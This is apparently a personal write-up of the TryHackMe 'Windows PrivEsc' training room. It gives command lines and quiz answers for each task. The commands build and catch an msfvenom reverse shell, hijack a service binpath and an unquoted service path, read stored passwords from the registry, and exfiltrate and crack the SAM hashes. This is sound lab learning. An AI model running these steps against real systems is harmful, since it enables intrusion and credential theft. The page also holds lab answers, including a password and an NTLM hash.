# Windows PrivEsc

{% embed url="https://tryhackme.com/room/windows10privesc" %}
https://tryhackme.com/room/windows10privesc
{% endembed %}

```bash
xfreerdp /v:10.10.12.59 /u:user /p:password321 /cert-ignore \                                                                                        12 ⨯
         +clipboard /dynamic-resolution /drive:share,/tmp
```

## Task 2 Generate a Reverse Shell Executable

#### Generate a reverse shell executable and transfer it to the Windows VM.&#x20;

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.12.59 LPORT=53 \
         -a x64 --platform windows -f exe -o reverse.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-20-46.png>)

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-15-26.png>)

```
copy \\10.6.9.176\kali\reverse.exe C:\PrivEsc
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-19-17.png>)

```
sudo nc -nvlp 53
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-20-14.png>)

## Task 3 Service Exploits - Insecure Service Permissions

```bash
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-26-15.png>)

```bash
sc qc daclsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-27-23.png>)

```bash
sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
net start daclsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-30-56.png>)

```bash
sudo nc -nvlp 53
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-31-07.png>)

#### What is the original BINARY\_PATH\_NAME of the daclsvc service?

{% hint style="success" %}
`C:\Program Files\DACL Service\daclservice.exe`
{% endhint %}

## Task 4 Service Exploits - Unquoted Service Path

```bash
sc qc unquotedsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-37-31.png>)

```bash
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-38-46.png>)

```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
net start unquotedsvc
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-42-44.png>)

```bash
sudo nc -nvlp 53
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 05-44-50.png>)

#### What is the BINARY\_PATH\_NAME of the unquotedsvc service?

{% hint style="success" %}
`C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
{% endhint %}

## Task 9 Passwords - Registry

```bash
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 06-36-38.png>)

```
winexe -U 'admin%password123' //10.10.132.141 cmd.exe
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 06-27-15.png>)

{% hint style="success" %}
`password123`
{% endhint %}

## Task 11 Passwords - Security Account Manager (SAM)

```bash
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

```bash
/usr/share/creddump7/pwdump.py SYSTEM SAM | tee hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 06-17-09.png>)

```bash
hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-29 06-18-30.png>)

#### What is the NTLM hash of the admin user?

{% hint style="success" %}
`a9fdfa038c4b75ebc76dc855dd74f0da`
{% endhint %}

## Task 16 Token Impersonation - Rogue Potato

{% embed url="https://github.com/mchern1kov/pentest-everything/blob/master/privesc/windows/README.md#token-impersonation-roguepotato" %}

#### Name one user privilege that allows this exploit to work.

{% hint style="success" %}
`SeImpersonatePrivilege`
{% endhint %}

#### Name the other user privilege that allows this exploit to work.

{% hint style="success" %}
`SeAssignPrimaryTokenPrivilege`
{% endhint %}



```bash
```

```bash
```

```bash
```
